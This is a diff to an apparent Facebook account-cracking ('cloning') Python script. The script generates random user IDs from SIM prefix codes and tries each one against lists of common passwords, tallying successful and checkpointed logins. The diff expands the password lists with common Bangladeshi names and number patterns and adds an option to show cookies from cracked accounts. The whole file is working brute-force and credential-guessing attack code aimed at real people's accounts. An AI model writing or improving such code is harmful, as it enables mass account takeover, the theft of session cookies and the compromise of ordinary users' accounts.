@@ -607,9 +607,10 @@ def ___bd1___():
 def ___bd2___():
     os.getuid
     os.geteuid
-    clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} EXAMPLE {xdxx}{w} 017 {G}•{G} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
     clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
     clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} COOKIES SHOW Y{G}|{W}N");linex();xmk = input(f'{xdx} SELECT {xdxx} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
@@ -618,8 +619,8 @@ def ___bd2___():
         print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
-            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],['bangladesh','free fire','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']]
-            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],['bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']]
+            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],"bangladesh","frist+'123","frist+'1234","frist+'123456","frist+'123123","last+'123","first+last","112233","123123","first+'last123","first+'last12","@first@","@1234@","@123456@","123456","first@@","113355","008866","12345@","nusrat"," nusrat123","jannat123","01*********","foysal123","sumon123","angel","first123@gmail.com","firstlast123@gmail.com","rakib123","rakib1234","faruk123","12345678","009988", "fariya123"," fariya1234,fast1997","first2000","first1999,first1998","@@@@####","@@@###","123456@#","rasel123","free fier","i love you","708090","203040","506070","ayesha","Bangladesh","jannat"]
+            elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],"bangladesh","frist+'123","frist+'1234","frist+'123456","frist+'123123","last+'123","first+last","112233","123123","first+'last123","first+'last12","@first@","@1234@","@123456@","123456","first@@","113355","008866","12345@","nusrat"," nusrat123","jannat123","01*********","foysal123","sumon123","angel","first123@gmail.com","firstlast123@gmail.com","rakib123","rakib1234","faruk123","12345678","009988", "fariya123"," fariya1234,fast1997","first2000","first1999,first1998","@@@@####","@@@###","123456@#","rasel123","free fier","i love you","708090","203040","506070","ayesha","Bangladesh","jannat"]
             __bal__.submit(___API___,ids,pwx,tl)
     print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
 #-----------------------❲ RANDOM INDIA ❳-----------------------#
